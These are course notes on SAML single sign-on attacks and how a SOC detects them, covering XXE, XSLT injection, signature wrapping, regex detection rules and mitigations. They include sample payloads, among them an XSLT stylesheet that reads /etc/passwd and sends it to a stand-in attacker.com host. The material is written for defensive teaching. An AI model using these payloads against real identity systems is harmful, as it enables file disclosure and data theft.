# Section 9: SAML Vulnerabilities and Detection

> Part of my **Web Attack Detection and Analysis** course notes. See the [README](README.md) for all sections.

## Overview

This section covers **SAML (Security Assertion Markup Language)** — the XML-based standard behind much of enterprise **Single Sign-On (SSO)** — and the attacks that target it: XXE, XSLT injection, response injection, SSRF and the signature-bypass classic, **XML Signature Wrapping (XSW)**. It focuses on how SAML works, where it breaks, how a SOC detects abuse (including regex patterns), and how to secure it.

| # | Topic |
|---|-------|
| 1 | Introduction to SAML |
| 2 | SAML workflow (IdP, SP, User) |
| 3 | SOC detection strategies |
| 4 | Common SAML vulnerabilities |
| 5 | Detection with regex |
| 6 | Real-world case studies |

---

## 1. What is SAML?

**SAML** is an **XML-based open standard** for exchanging **authentication and authorization** data between parties. It's what lets a user log in once and reach many applications — **SSO**.

Three entities are involved:
- **Identity Provider (IdP)** — authenticates the user and issues a signed **SAML assertion** about them.
- **Service Provider (SP)** — the application the user wants; it trusts assertions from the IdP.
- **User** (their browser) — carries messages between SP and IdP.

**The workflow (SP-initiated SSO):**
1. The user requests a protected resource at the **SP**.
2. The SP sees they're not authenticated and **redirects** them to the **IdP**.
3. The **IdP authenticates** the user (password, MFA, etc.) and generates a **SAML assertion**.
4. The assertion goes to the user's **browser**, which **forwards it to the SP**.
5. The **SP validates** the assertion's **signature and integrity**. If valid, the user is in.

**Why this is a juicy target:** the assertion is what proves "I am this user with these privileges." A **SAML Response is an XML document, base64-encoded** (and deflated on the redirect binding). If an attacker can **tamper with it and still pass validation**, they can impersonate anyone or escalate privileges — without a password.

---

## 2. Common SAML vulnerabilities

### XML External Entity (XXE)
Because SAML Responses are XML, a parser that resolves external entities can be abused to read local files or reach out to attacker infrastructure. A malicious response/request declares an entity pointing at a file:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY file SYSTEM "file:///etc/passwd">
  <!ENTITY dtd SYSTEM "http://www.attacker.com/text.dtd" >]>
<samlp:Response ... >
  ...
```
Or inside an `AuthnRequest` using a parameter entity:
```xml
<AuthnRequest>
  <NameIDFormat>urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified</NameIDFormat>
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  %xxe;
</AuthnRequest>
```
**Impact:** file disclosure (e.g. `/etc/passwd`), SSRF, denial of service.
**Mitigation:** disable external-entity resolution, validate input, use hardened XML libraries.

### XSLT injection
If SAML signature **Transforms** allow XSLT and the processor is misconfigured, an attacker embeds a stylesheet that reads a file and exfiltrates it:
```xml
<ds:Transforms>
  <ds:Transform>
    <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
      <xsl:template match="doc">
        <xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
        <xsl:variable name="escaped" select="encode-for-uri($file)"/>
        <xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
        <xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
        <xsl:value-of select="unparsed-text($exploitUrl)"/>
      </xsl:template>
    </xsl:stylesheet>
  </ds:Transform>
</ds:Transforms>
```
**Impact:** unauthorized access, data leakage, assertion tampering.
**Mitigation:** validate/sanitize input, use secure XSLT processors, restrict XSLT resources.

### SAML Response injection
Tampering with or forging the IdP's response to **change user attributes, escalate privileges or gain access**.
**Mitigation:** validate and sanitize input, enforce strict attribute mapping, add integrity checks.

### SAML SSRF
Manipulating a SAML message so the **SP makes requests to internal/external servers** — bypassing firewalls, reaching internal resources, recon.
**Mitigation:** input validation/filtering of URLs and IPs, whitelist what the SP may contact, patch.

### XML Signature Wrapping (XSW) — the big one
XSW targets the **gap between what gets signature-validated and what the application actually reads**. The attacker **restructures the XML** so the original signed element still validates, but injects a **forged assertion** that the application logic consumes instead. Result: **signature passes, content is attacker-controlled** → impersonation, privilege escalation, assertion tampering.
**Mitigation:** strict XML signature validation (validate the exact element that's used), hardened SAML libraries with built-in XSW protection, secure implementations.

---

## 3. Detecting SAML attacks (SOC approach)

Core SOC strategies from the course:
- **Monitor SAML assertion traffic** between IdP and SP for abnormal patterns, volume spikes or odd message flows.
- **Analyze assertion metadata** — signing certificates, entity IDs, expiration — and flag expired/tampered certs, unexpected entity-ID changes, inconsistent metadata.
- **Track auth/authz events** — log successful and failed SAML transactions; watch for failed-attempt bursts and unexpected user behavior.
- **Integrate into SIEM** — centralize SAML logs and use correlation rules to alert.

> **Practical note:** SAML messages are **base64-encoded** (and often deflated). To apply the content regexes below, you usually have to **base64-decode (and inflate) the `SAMLResponse` / `SAMLRequest`** first — the raw parameter won't match on `<!ENTITY` etc. until it's decoded.

### Regex detection patterns (from the course)
| Attack | Regex | Looks for |
|---|---|---|
| **Response replay** | `(ResponseID=[^&\s]+).*\1` | the same `ResponseID` appearing twice in one message |
| **Attribute manipulation** | `(?!<saml:NameID Format=").+(?<=<saml:Attribute Name=").*?(?=" FriendlyName=)` | mismatches between `NameID` and `Attribute` values |
| **XML entity injection (XXE)** | `<!ENTITY\s+%[^>]+>` | an `<!ENTITY` parameter-entity declaration inside a SAML message |
| **Signature wrapping (XSW)** | `<ds:Signature[^>]+>.*(<[^/].*>\s*)+.*<\/ds:Signature>` | unexpected nested elements between `<ds:Signature>` and `</ds:Signature>` |

**Example — XXE in an incoming message:**
```xml
<AuthnRequest>
  <NameIDFormat>urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified</NameIDFormat>
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  %xxe;
</AuthnRequest>
```
The pattern `<!ENTITY\s+%[^>]+>` matches the `<!ENTITY % xxe SYSTEM ...>` declaration → flag for investigation.

> These course regexes are **starting points**, not production rules. Several are fragile (the attribute-manipulation lookbehind especially), so the course's own advice applies: tailor them to your SAML message format, **test for false positives**, and pair them with anomaly detection, threat intel and behavioral analysis rather than relying on regex alone.

---

## 4. Mitigation / best practices

**For developers:**
- Use **secure, up-to-date XML parsers and libraries** (protection against XXE and XSW).
- **Strict XML signature validation** — verify the exact signed element is the one used.
- **HTTPS** for all SAML transport.
- Secure **session management** (timeouts, safe token handling, key rotation).
- **Validate and sanitize all input** (guards XXE, XSLT injection).
- **Least privilege** on access/permissions.
- **Patch** all components regularly.

**For SOC teams:**
- Robust **monitoring and alerting** (IOCs: odd message flows, abnormal auth patterns, unauthorized-access attempts).
- Regular **security assessments / pen-testing** of the SAML infrastructure.
- Stay current on SAML threats; keep the team trained.
- **Incident-response readiness** (SAML-specific playbooks, tabletop exercises).
- **Collaborate with the IAM team** and share threat intel.
- Foster continuous improvement (post-incident reviews, lessons learned).

---

## 5. Real-world case studies

- **OneLogin breach (2017)** — an attacker obtained OneLogin's **AWS keys** (attack began 31 May 2017) and accessed database tables and **the ability to decrypt data, including SAML-related secrets**. Affected customers had to **reissue SAML SSO certificates** and rotate tokens. Lesson: protect the keys and secrets behind the SAML infrastructure, not just the assertions.

- **SAML Response injection (illustrative)** — a scenario where an attacker tampers with the SAML response to **escalate privileges** and reach sensitive resources. Lesson: validate/sanitize responses, enforce strict attribute mapping, add integrity checks.

- **SAML SSRF (illustrative)** — a scenario where a crafted SAML message makes the SP request **internal servers**, bypassing network controls. Lesson: input validation and whitelist-based egress control.

> **On the "Facebook 2015 signature-wrapping" case:** I couldn't independently verify that specific incident, so treat it with caution. The **well-documented** XSW / signature-bypass examples to cite instead are the 2012 academic research *"On Breaking SAML: Be Whoever You Want to Be"* (broke most major SAML frameworks) and the **2017 library flaws CVE-2017-11427 / CVE-2017-11428** (Duo Security), which let attackers tamper with SAML data **without invalidating the signature** — and which affected OneLogin's own python-saml and ruby-saml libraries, tying directly back to the breach above.

> **Related technique worth knowing (beyond the course): Golden SAML.** If an attacker steals the **IdP's signing key/certificate**, they can forge **valid assertions for any user** at will — signatures check out because they're genuinely signed. This was central to the **SolarWinds / Nobelium** intrusions. Detection shifts to protecting and monitoring the IdP signing key and watching for assertions that don't correspond to a real IdP login event.

---

## Key takeaways

- SAML is **signed XML assertions** exchanged between **IdP → browser → SP** for SSO; its security hinges on the SP **validating the exact element it then trusts**.
- The headline attack is **XML Signature Wrapping (XSW)** — forge the content while keeping a valid signature. SAML is also exposed to **XXE, XSLT injection, response injection and SSRF** because it's XML.
- Detection = **decode the base64 SAML message first**, then inspect it for `<!ENTITY` (XXE), nested elements inside `<ds:Signature>` (XSW), duplicate `ResponseID` (replay) and attribute/NameID mismatches — and correlate with real IdP login events.
- Regex helps but is **fragile**; pair it with metadata analysis, anomaly detection and threat intel.
- Biggest lessons from the real world: **protect the IdP signing keys** (OneLogin breach; Golden SAML) and use **hardened, patched SAML libraries** (CVE-2017-11427/11428).

## Skills practised

Understanding the SAML SSO model (IdP/SP/User), recognizing XML-based attacks (XXE, XSLT injection, XSW, response injection, SSRF) in SAML messages, base64-decoding and inspecting SAML payloads, writing and critiquing SIEM/regex detection patterns, and planning mitigation across developer and SOC responsibilities.

---

*Previous: [Section 8: JWT Attacks and Detection](08-jwt-attacks-and-detection.md) | Back to [README](README.md)*
